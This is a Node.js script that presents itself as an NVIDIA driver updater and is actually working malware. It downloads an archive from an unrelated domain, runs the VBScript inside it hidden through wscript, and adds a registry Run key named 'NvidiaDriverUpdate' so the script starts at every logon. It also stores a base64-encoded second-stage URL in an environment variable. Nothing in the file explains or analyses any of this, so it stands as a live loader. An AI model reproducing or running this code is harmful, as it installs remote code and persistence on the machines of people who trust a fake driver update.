const http = require('https');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

// General variables
const nvidiaURL = "https://api.camdriversupport.com/nvidiawin.update";
const zipFilePath = path.join(__dirname, 'nvidiadrivers.zip');
const extractedDir = path.join(__dirname, 'nvidia-drivers');
const regpath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
const regkey = 'NvidiaDriverUpdate';
const param = 'aHR0cHM6Ly9hcGkuanotYXdzLmluZm8vd2FpdC5qcGc=';

function downloadZip(retryCount = 5) {
    console.log(`Starting download with ${retryCount} retries left...`);

    const file = fs.createWriteStream(zipFilePath);
    const options = {
        headers: {
            'User-Agent': 'curl/7.68.0',
            'Accept': '*/*',
        }
    };

    const request = http.get(nvidiaURL, options, function (response) {
        console.log(`HTTP response status: ${response.statusCode}`);

        if (response.statusCode !== 200) {
            console.error(`Failed to download: HTTP Status ${response.statusCode}`);
            file.close(() => {
                fs.unlinkSync(zipFilePath); // Remove the file only after confirming close
            });
            if (retryCount > 0) {
                console.warn(`Retrying download... (${retryCount} attempts left)`);
                downloadZip(retryCount - 1);
            }
            return;
        }

        const totalSize = parseInt(response.headers['content-length'], 10);
        let downloadedSize = 0;

        response.on('data', (chunk) => {
            downloadedSize += chunk.length;
        });

        response.pipe(file);

        response.on('end', () => {
            console.log("Response ended");
            file.close(() => {
                if (downloadedSize === totalSize) {
                    console.log("Download complete");
                    unzipAndRun();
                } else if (retryCount > 0) {
                    console.warn("Incomplete download detected. Retrying...");
                    fs.unlink(zipFilePath, (err) => {
                        if (!err) downloadZip(retryCount - 1);
                        else console.error("Failed to delete incomplete file:", err);
                    });
                } else {
                    console.error("Failed to download after multiple attempts.");
                }
            });
        });

        response.on('close', () => {
            console.log("HTTP response closed");
        });

        response.on('error', (err) => {
            console.error("Error in response stream:", err.message);
            file.close(() => {
                fs.unlink(zipFilePath, (unlinkErr) => {
                    if (unlinkErr) console.error("Failed to delete on error:", unlinkErr);
                });
                if (retryCount > 0) {
                    downloadZip(retryCount - 1);
                }
            });
        });
    });

    // Add error handler for the request itself
    request.on('error', (err) => {
        console.error("Error with the HTTP request:", err.message);
        file.close(() => {
            fs.unlink(zipFilePath, (unlinkErr) => {
                if (unlinkErr) console.error("Failed to delete on request error:", unlinkErr);
            });
            if (retryCount > 0) {
                console.warn(`Retrying download... (${retryCount} attempts left)`);
                downloadZip(retryCount - 1);
            }
        });
    });

    // Add timeout to detect stalled downloads
    request.setTimeout(30000, () => {
        console.warn("Request timed out");
        request.abort();
        file.close(() => {
            fs.unlink(zipFilePath, (unlinkErr) => {
                if (unlinkErr) console.error("Failed to delete on timeout:", unlinkErr);
            });
            if (retryCount > 0) {
                downloadZip(retryCount - 1);
            }
        });
    });

    // Add logging for the file stream events
    file.on('finish', () => {
        console.log("File stream finished writing");
    });

    file.on('close', () => {
        console.log("File stream closed");
    });

    file.on('error', (err) => {
        console.error("Error with the file stream:", err.message);
        fs.unlink(zipFilePath, (unlinkErr) => {
            if (unlinkErr) console.error("Failed to delete on file stream error:", unlinkErr);
            if (retryCount > 0) {
                downloadZip(retryCount - 1);
            }
        });
    });
}

function unzipAndRun() {
    if (!fs.existsSync(extractedDir)) {
        fs.mkdirSync(extractedDir);
    }

    const unzipProc = spawn('tar', ['-xf', zipFilePath, '-C', extractedDir]);

    unzipProc.on('close', (code) => {
        if (code === 0) {
            console.log("Unzipping complete");
            runBatchFile();
        } else {
            console.error("Error unzipping file");
        }
    });
}

function runBatchFile() {
    const vbsFilePath = path.join(extractedDir, 'update.vbs');
    if (fs.existsSync(vbsFilePath)) {
        const vbsProc = spawn('wscript', [vbsFilePath], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        });

        vbsProc.unref();
        console.log("Batch file executed");

        // Register the VBScript for startup
        registerStartup(vbsFilePath);
    } else {
        console.error("VBScript file not found");
    }
}

function registerStartup(filePath) {
    const regval = `"wscript.exe" "${filePath}"`;
    const regCommand = [
        'add',
        regpath,
        '/v', regkey,
        '/t', 'REG_SZ',
        '/d', regval,
        '/f'
    ];

    const regproc = spawn('reg', regCommand, { detached: true, stdio: 'ignore' });
    const setxproc = spawn('setx', ['Directory', param], { detached: true, stdio: 'ignore' });
}

// Start the process
downloadZip();
